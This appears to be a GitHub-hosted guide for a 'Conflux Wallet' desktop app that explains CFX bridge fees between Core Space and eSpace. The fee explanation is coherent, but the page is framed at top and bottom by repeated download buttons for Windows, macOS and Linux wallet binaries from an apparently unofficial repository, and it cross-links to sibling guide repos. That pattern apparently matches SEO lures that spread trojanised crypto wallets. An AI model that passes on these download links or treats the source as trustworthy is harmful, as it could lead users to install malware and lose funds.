![Conflux Wallet](assets/banner-article.png)

# Bridge Gas and Fees

<p align="center">Bridge Gas and Fees: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** Bridging CFX between Core Space and eSpace costs gas on each ledger it touches: one fee into eSpace, two coming back. There is no setting that merges them, and the only way to pay once is to never need the second leg - which is impossible in the return direction.

## Two legs, two fees

A cross-space transfer is not one transaction that the network stretches across two ledgers. It is one transaction that moves value into an intermediate state, plus a second transaction that completes the move, and each is paid where it happens. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/bridge-cfx-from-conflux-core-space-to-espace.md covers the mechanism itself; this page is only about what it costs.

That is why a bridge fee quote that shows a single number is describing one leg. The number is correct and incomplete, and the gap is where people discover the second fee - with an account that no longer has anything to pay it.

## Core to eSpace

One leg, one fee, paid in Core Space CFX by the sending account. The transaction is atomic: the value leaves Core Space and arrives on eSpace in the same step, and the fee is charged once regardless of the amount moved.

This direction is the cheap one because there is nothing to finish afterwards. If your only goal is to reach eSpace, this is the whole cost.

## eSpace to Core

Two legs, two fees. The first is paid in eSpace CFX, from the account holding the balance. The second - the withdrawal from the Core Space side - is paid in Core Space CFX, from the account that is receiving the value.

The second fee is the one that surprises people, because the receiving account often has no CFX at all until the transfer completes. The order in which the two balances exist is what makes this a funding problem rather than a pricing one.

## Which side pays

Each leg's fee comes from the account that sends that leg. There is no sponsor, no relayer and no option to bill the destination for the return trip, so a wallet cannot make the second fee disappear however the transfer is started.

Practical rule: before starting an eSpace to Core transfer, check that the Core Space account has a small CFX balance. If it does not, move a little there first - the fee is minor, and having it is the difference between a completed transfer and an intermediate state you have to revisit.

## Leaving enough behind

Transfers of an entire balance are the source of most bridge failures. The first leg takes everything, and the account that must pay for the second has nothing, so the operation pauses at the exact point where it cannot continue.

Leave a margin in both accounts. https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-balance-shows-zero.md is the check to run when a balance looks smaller than the arithmetic suggests, and https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-wallet-bridge-stuck.md is what to do once a transfer has already paused.

## Can you avoid paying twice?

Not in the return direction, and it is worth being precise about why: the two fees pay for two different transactions on two different ledgers, so any claim that one fee covers both is a claim that one of the transactions is free. It is not.

What you can avoid is paying for the same leg twice, by not re-sending a leg that already succeeded. That is the only realistic saving, and it comes from reading the hashes rather than from a setting.

## Sponsorship

Core Space supports a sponsorship mechanism in which a contract can cover gas for its users, which is why some Conflux applications feel free to use. It applies to contract interactions that have been sponsored, not to a plain CFX transfer or to a cross-space leg you initiate yourself.

So a sponsored dApp on eSpace does not make bridging free, and a bridge interface does not inherit sponsorship from the chain. If a fee is quoted, it is being paid by someone, and that someone is the sender.

## What the fee is not

It is not a bridge commission in the sense of a percentage of the amount. The cost is network gas for the transactions involved, which is why moving a large amount and a small amount cost roughly the same. https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-gas-and-fees.md breaks the components down, and none of them scale with the amount.

That has a practical consequence: bridging is cheap in percentage terms when the amount is meaningful and expensive when it is not. Consolidating small balances before moving them is usually better than moving each one.

## Planning the round trip

Decide the direction first, because the directions differ, and use the current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14) to check both balances rather than one. Into eSpace: one fee, atomic, done. Back to Core: two fees, and the second one needs CFX waiting in an account that may not have any.

Then add a margin to both sides rather than an exact amount. The difference between a transfer that completes and one that stalls is usually a fraction of a CFX left in the right place, and https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-core-space-vs-espace.md explains why the two balances are separate in the first place. Because the app is actively maintained, the current release published on the release page is the baseline for everything described here.

## FAQ

### Which side pays the gas when bridging CFX?

Each leg pays on its own side. Core to eSpace is paid on Core; the return trip needs eSpace gas for the first leg and Core Space gas for the withdrawal.

### How do I bridge CFX without paying gas twice?

You cannot, in the return direction - two legs are two transactions. What you can avoid is paying twice for the same leg by not re-sending it.

### Why did my bridge transfer stop half-way?

The second leg was never sent, usually because the Core Space account had no CFX to pay for it. Fund it, then complete the withdrawal.

### Is the bridge fee a percentage of my transfer?

No. It is network gas, so a large transfer and a small one cost about the same. Move larger amounts less often rather than many small ones.

### Does sponsorship make bridging free?

No. Sponsorship covers gas for specific sponsored contract calls on Core Space, not for cross-space legs you initiate yourself.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [Bridge CFX Across Spaces](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/bridge-cfx-from-conflux-core-space-to-espace.md)
- [Bridge Transfer Stuck](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-wallet-bridge-stuck.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
